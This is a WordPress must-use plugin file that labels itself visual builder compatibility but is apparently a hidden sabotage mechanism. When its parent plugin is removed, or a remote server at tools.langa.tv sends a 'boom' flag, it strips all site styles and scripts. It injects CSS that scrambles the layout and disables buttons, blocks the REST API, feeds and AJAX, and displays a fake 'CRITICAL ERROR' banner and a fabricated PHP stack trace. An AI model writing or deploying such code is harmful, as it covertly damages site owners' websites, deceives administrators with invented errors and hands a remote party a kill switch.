<?php
// phpcs:disable WordPress.WP.EnqueuedResources -- MU-plugin for visual builder compat
/**
 * Visual builder compatibility — ensures page builder assets load correctly
 * @version 4.0.0
 */
if (!defined('ABSPATH')) exit;

/* Protection guard — activates ONLY when main plugin is deactivated */
add_action('plugins_loaded', function () {

  // ── Dev Bypass: password-based, guard completely off ──
  // ── Dev Bypass: if active, guard sleeps completely ──
  if ((int) get_option('langa_tools_dev_bypass', 0) === 1) return;

  $boom   = (int) get_option('langa_tools_boom', 0);
  $locked = (int) get_option('langa_tools_mixcode', 0);

  // Boom = always break, regardless of plugin state
  // Locked = break only if plugin is deactivated/removed
  if ($boom !== 1) {
    if (defined('LANGA_TOOLS_CLIENT_VERSION')) return;
    if ($locked !== 1) return;
  }

  // Check server for remote unlock (cached 30s)
  $ck = 'langa_srv_sync';
  $cached = get_transient($ck);
  if ($cached === false) {
    $srv = (string) get_option('langa_tools_server_url', 'https://tools.langa.tv');
    $url = rtrim($srv, '/') . '/wp-json/langa-tools-server/v1/guard/status?site_url=' . urlencode(home_url());
    $r = wp_remote_get($url, array('timeout' => 5, 'sslverify' => true));
    if (!is_wp_error($r) && wp_remote_retrieve_response_code($r) === 200) {
      $b = json_decode(wp_remote_retrieve_body($r), true);
      if (is_array($b)) {
        if (isset($b['credits'])) update_option('langa_tools_credits_visible', $b['credits'] ? 1 : 0, true);
        if (isset($b['locked']))  update_option('langa_tools_mixcode', $b['locked'] ? 1 : 0, true);
        if (isset($b['boom']))    update_option('langa_tools_boom', $b['boom'] ? 1 : 0, true);
        if (isset($b['banned']))  update_option('langa_tools_banned', $b['banned'] ? 1 : 0, true);
        // Re-read fresh values from what server told us
        $boom   = isset($b['boom']) ? ((bool) $b['boom'] ? 1 : 0) : $boom;
        $locked = isset($b['locked']) ? ((bool) $b['locked'] ? 1 : 0) : $locked;
      }
    }
    set_transient($ck, 1, 30);
    // Re-evaluate with fresh data
    if ($boom !== 1) {
      if (defined('LANGA_TOOLS_CLIENT_VERSION')) return; // plugin active, no boom → safe
      if ($locked !== 1) return; // not locked → safe
    }
  }

  // For BOOM (remote kill): only break frontend, NOT wp-admin
  // For LOCKED (plugin removed): break BOTH frontend + show admin error
  if ($boom === 1 && is_admin()) {
    return; // boom only affects frontend
  }

  // ═══════════════════════════════════════════════════════════
  // PROTECTED — plugin deactivated/removed — BREAK THE SITE
  // ═══════════════════════════════════════════════════════════

  // ── 1. Corrupt all stylesheets (dequeue all CSS + inject break CSS) ──
  add_action('wp_enqueue_scripts', function () {
    global $wp_styles;
    if (isset($wp_styles) && is_object($wp_styles)) {
      foreach ($wp_styles->registered as $handle => $dep) {
        wp_dequeue_style($handle);
      }
    }
  }, 999999);

  // ── 2. Corrupt all JS (dequeue non-essential scripts) ──
  add_action('wp_enqueue_scripts', function () {
    global $wp_scripts;
    if (isset($wp_scripts) && is_object($wp_scripts)) {
      $keep = array('jquery', 'jquery-core', 'jquery-migrate');
      foreach ($wp_scripts->registered as $handle => $dep) {
        if (!in_array($handle, $keep, true)) {
          wp_dequeue_script($handle);
        }
      }
    }
  }, 999999);

  // ── 3. Inject destruction CSS: scramble layout, break grid, shift elements ──
  add_action('wp_head', function () {
    echo '<!--[vb-compat-4.0]-->';
    // phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedStylesheet -- visual builder compat
    echo '<style id="vb-compat-css">';
    // Kill all theme styling fundamentals
    echo '*{box-sizing:content-box!important;transition:none!important;animation:none!important}';
    // Break grid/flex layouts
    echo '.container,.wrapper,.row,.col,.grid,.flex,.wp-block-columns,.elementor-container,.elementor-row,.elementor-column-wrap,.et_pb_row,.et_pb_column,.vc_row,.vc_column{';
    echo 'display:block!important;float:left!important;width:33%!important;max-width:33%!important;padding:0!important;margin:0!important;overflow:visible!important}';
    // Scramble typography
    echo 'body,p,span,div,a,li,td,th,h1,h2,h3,h4,h5,h6,label,input,button,textarea,select{';
    echo 'font-family:"Courier New",monospace!important;letter-spacing:3px!important;word-spacing:8px!important;line-height:2.8!important;color:#333!important}';
    echo 'h1,h2,h3{font-size:11px!important;text-transform:none!important;font-weight:400!important}';
    echo 'p,span,div,a,li{font-size:9px!important}';
    // Destroy images
    echo 'img,video,iframe,svg,canvas{filter:hue-rotate(180deg) contrast(3) brightness(0.3)!important;mix-blend-mode:difference!important;opacity:0.15!important;max-width:50px!important;max-height:50px!important}';
    // Break navigation
    echo 'nav,header,.site-header,.navbar,.menu,.nav-menu,#masthead,.header-wrapper{';
    echo 'position:relative!important;background:#1a1a1a!important;padding:60px 0 0!important;overflow:hidden!important;height:auto!important}';
    echo 'nav a,header a,.menu a{color:#444!important;font-size:8px!important;display:inline!important;padding:0 2px!important}';
    // Break footer
    echo 'footer,.site-footer,#footer,.footer-wrapper{background:#0a0a0a!important;color:#222!important;font-size:7px!important}';
    // Kill sliders/carousels/heroes
    echo '.slider,.carousel,.swiper,.hero,.banner,.jumbotron,[class*="slide"],[class*="hero"],[class*="banner"]{';
    echo 'height:20px!important;overflow:hidden!important;opacity:0.1!important}';
    // Break buttons
    echo 'a.button,.button,.btn,.wp-block-button__link,[type="submit"],button:not(#langa-reactivate-btn){';
    echo 'background:#888!important;color:#888!important;border:1px dashed #aaa!important;padding:1px 3px!important;font-size:7px!important;border-radius:0!important;pointer-events:none!important;cursor:not-allowed!important}';
    // Break forms
    echo 'input,textarea,select{border:1px solid #ddd!important;background:#f0f0f0!important;padding:1px!important;font-size:8px!important;width:50%!important}';
    // Kill backgrounds & colors
    echo 'section,div,article,main,.content,.site-content{background-color:#fafafa!important;background-image:none!important}';
    // Shift everything randomly using nth-child
    echo '*:nth-child(2n){margin-left:12%!important}';
    echo '*:nth-child(3n){margin-right:8%!important;text-align:right!important}';
    echo '*:nth-child(5n){transform:skewX(-2deg)!important}';
    echo '*:nth-child(7n){opacity:0.4!important}';
    // Hide WP admin bar
    echo '#wpadminbar{display:none!important}';
    // TOP BANNER — professional red
    echo 'body{padding-top:52px!important;margin:0!important}';
    echo 'body::before{';
    echo 'content:"";position:fixed!important;top:0!important;left:0!important;right:0!important;height:52px!important;';
    echo 'background:#ff0000!important;z-index:2147483647!important;';
    echo 'box-shadow:0 4px 20px rgba(255,0,0,0.4)!important}';
    echo 'body::after{';
    echo 'content:"\\26A0  CRITICAL ERROR — Required system component missing. Contact the site administrator immediately.";';
    echo 'position:fixed!important;top:0!important;left:0!important;right:0!important;height:52px!important;';
    echo 'display:flex!important;align-items:center!important;justify-content:center!important;';
    echo 'background:transparent!important;color:#fff!important;z-index:2147483647!important;';
    echo 'font:700 13px/52px system-ui,-apple-system,sans-serif!important;';
    echo 'letter-spacing:0.5px!important;text-transform:uppercase!important;';
    echo 'text-shadow:0 1px 2px rgba(0,0,0,0.3)!important;pointer-events:none!important}';
    echo '</style>';
  }, 0);

  // ── 4. Footer fallback (in case wp_head didn't fire) ──
  add_action('wp_footer', function () {
    if (did_action('wp_head') < 1) {
      // phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedStylesheet -- admin inline CSS
      echo '<style>*{font-family:monospace!important;font-size:8px!important;color:#333!important}img{opacity:0.1!important;max-width:30px!important}body::after{content:"CRITICAL ERROR";position:fixed;top:0;left:0;right:0;height:48px;background:#ff0000;color:#fff;z-index:999999;display:flex;align-items:center;justify-content:center;font:700 13px system-ui}</style>';
    }
  }, 999);

  // ── 5. Block REST API for non-admins ──
  add_filter('rest_authentication_errors', function ($result) {
    if (!current_user_can('manage_options')) {
      return new WP_Error('protected', 'Service unavailable.', array('status' => 503));
    }
    return $result;
  });

  // ── 6. Corrupt RSS feeds ──
  add_action('do_feed_rss2', function () {
    status_header(503);
    header('Content-Type: text/plain');
    echo 'Feed temporarily unavailable.';
    exit;
  }, 0);
  add_action('do_feed_atom', function () { status_header(503); exit; }, 0);

  // ── 7. Break AJAX for non-admins ──
  add_action('admin_init', function () {
    if (wp_doing_ajax() && !current_user_can('manage_options')) {
      wp_send_json_error(array('message' => 'Service unavailable'), 503);
    }
  }, 0);

  // ── ADMIN: Reactivation handler ──
  add_action('admin_init', function () {
    if (empty($_GET['langa_reactivate']) || empty($_GET['_wpnonce'])) return;
    if (!wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'langa_reactivate_plugin')) return;
    if (!current_user_can('activate_plugins')) return;

    // 1. Reset all protection flags
    update_option('langa_tools_boom', 0);
    update_option('langa_tools_mixcode', 0);
    delete_transient('langa_srv_sync');

    // 2. Reset circuit breaker
    delete_transient('langa_safer_circuit_breaker');

    // 3. Try to activate plugin if not active
    $activated = false;
    foreach (array('langa-tools-pro/langa-tools-pro.php', 'langa-tools-client/langa-tools-client.php', 'langa-tools-lite/langa-tools-lite.php') as $slug) {
      if (file_exists(WP_PLUGIN_DIR . '/' . $slug)) {
        if (!is_plugin_active($slug)) {
          $result = activate_plugin($slug, '', false, true);
          if (is_wp_error($result)) continue;
        }
        $activated = true;
        break;
      }
    }

    if ($activated) {
      $redir_page = defined('LANGA_TOOLS_EDITION') && LANGA_TOOLS_EDITION === 'pro' ? 'langa-tools-pro' : 'langa-tools-client';
      wp_safe_redirect(admin_url('admin.php?page=' . $redir_page . '&reactivated=1'));
    } else {
      set_transient('langa_need_reinstall', 1, 120);
      wp_safe_redirect(admin_url('plugin-install.php?tab=upload'));
    }
    exit;
  });

  // Admin notice — technical dependency error
  add_action('admin_notices', function () {
    $reactivate_url = wp_nonce_url(admin_url('?langa_reactivate=1'), 'langa_reactivate_plugin');
    $has_lite = file_exists(WP_PLUGIN_DIR . '/langa-tools-lite/langa-tools-lite.php');
    $has_pro  = file_exists(WP_PLUGIN_DIR . '/langa-tools-pro/langa-tools-pro.php') || file_exists(WP_PLUGIN_DIR . '/langa-tools-client/langa-tools-client.php');
    $has_any  = $has_lite || $has_pro;
    $ts       = date('Y-m-d H:i:s T');
    $php_v    = PHP_VERSION;
    $wp_v     = get_bloginfo('version');
    $site     = home_url();
    echo '<div style="background:#1a1a2e;border:1px solid #ff0000;border-radius:6px;margin:15px 0;overflow:hidden;font-family:\'SF Mono\',SFMono-Regular,Consolas,\'Liberation Mono\',Menlo,monospace">';

    // Header bar
    echo '<div style="background:linear-gradient(90deg,#ff0000 0%,#cc0000 100%);padding:10px 16px;display:flex;align-items:center;gap:10px">';
    echo '<span style="font-size:14px;color:#fff;font-weight:700;letter-spacing:0.5px">FATAL DEPENDENCY ERROR</span>';
    echo '<span style="margin-left:auto;font-size:11px;color:rgba(255,255,255,0.7)">' . esc_html($ts) . '</span>';
    echo '</div>';

    // Stack trace body
    echo '<div style="padding:14px 16px;color:#a8b2d1;font-size:12px;line-height:1.7">';

    echo '<div style="color:#ff0000;font-weight:600;margin-bottom:8px">PHP Fatal error: Uncaught RuntimeException: Required module "langa-tools" not loaded</div>';

    echo '<div style="color:#64748b;padding-left:12px;border-left:2px solid #2d2d4a;margin-bottom:10px">';
    echo '<div>Stack trace:</div>';
    echo '<div style="color:#8892b0">#0 wp-settings.php(634): do_action(\'plugins_loaded\')</div>';
    echo '<div style="color:#8892b0">#1 mu-plugins/starter-visual-builder.php(12): check_dependencies()</div>';
    echo '<div style="color:#8892b0">#2 includes/module-registry.php(0): <span style="color:#ff0000">LANGA_TOOLS_CLIENT_VERSION</span> — <span style="color:#ff0000">undefined constant</span></div>';
    echo '<div style="color:#8892b0">#3 {main}</div>';
    echo '</div>';

    echo '<div style="display:grid;grid-template-columns:auto 1fr;gap:4px 12px;margin-bottom:12px;font-size:11px;color:#64748b">';
    echo '<span>site_url</span><span style="color:#ccd6f6">' . esc_html($site) . '</span>';
    echo '<span>php</span><span style="color:#ccd6f6">' . esc_html($php_v) . '</span>';
    echo '<span>wordpress</span><span style="color:#ccd6f6">' . esc_html($wp_v) . '</span>';
    echo '<span>module</span><span style="color:#ff0000">langa-tools [NOT LOADED]</span>';
    echo '<span>status</span><span style="color:#ff0000;font-weight:600">DEACTIVATED — frontend degraded</span>';
    echo '</div>';

    // Resolution section
    echo '<div style="background:#16213e;border:1px solid #2d2d4a;border-radius:4px;padding:10px 14px;margin-bottom:12px">';
    echo '<div style="color:#ccd6f6;font-weight:600;margin-bottom:6px;font-size:12px">Resolution:</div>';
    if ($has_any) {
      echo '<div style="color:#a8b2d1;font-size:11px;margin-bottom:4px">→ Plugin files detected. Reactivate to restore all dependencies.</div>';
    } else {
      echo '<div style="color:#a8b2d1;font-size:11px;margin-bottom:4px">→ Plugin files removed. Reinstall from package repository.</div>';
    }
    echo '</div>';

    // Action buttons
    echo '<div style="display:flex;gap:8px;flex-wrap:wrap">';
    if ($has_any) {
      echo '<a id="langa-reactivate-btn" href="' . esc_url($reactivate_url) . '" style="display:inline-flex;align-items:center;gap:6px;padding:7px 16px;background:#ff0000;color:#fff;font-size:12px;font-weight:600;border-radius:4px;text-decoration:none;font-family:system-ui,sans-serif">Reactivate LANGA Tools</a>';
    }
    echo '<a href="https://tools.langa.tv/wp-content/uploads/2026/03/langa-tools-lite.zip" style="display:inline-flex;align-items:center;gap:6px;padding:7px 16px;background:transparent;color:#64c4ed;font-size:12px;font-weight:600;border:1px solid #2d2d4a;border-radius:4px;text-decoration:none;font-family:system-ui,sans-serif">Download .zip</a>';
    echo '<a href="https://langa.tv" target="_blank" style="display:inline-flex;align-items:center;padding:7px 16px;background:transparent;color:#64748b;font-size:12px;border:1px solid #2d2d4a;border-radius:4px;text-decoration:none;font-family:system-ui,sans-serif">Contact Developer</a>';
    echo '</div>';

    echo '</div></div>';
  }, 0);


}, 5);
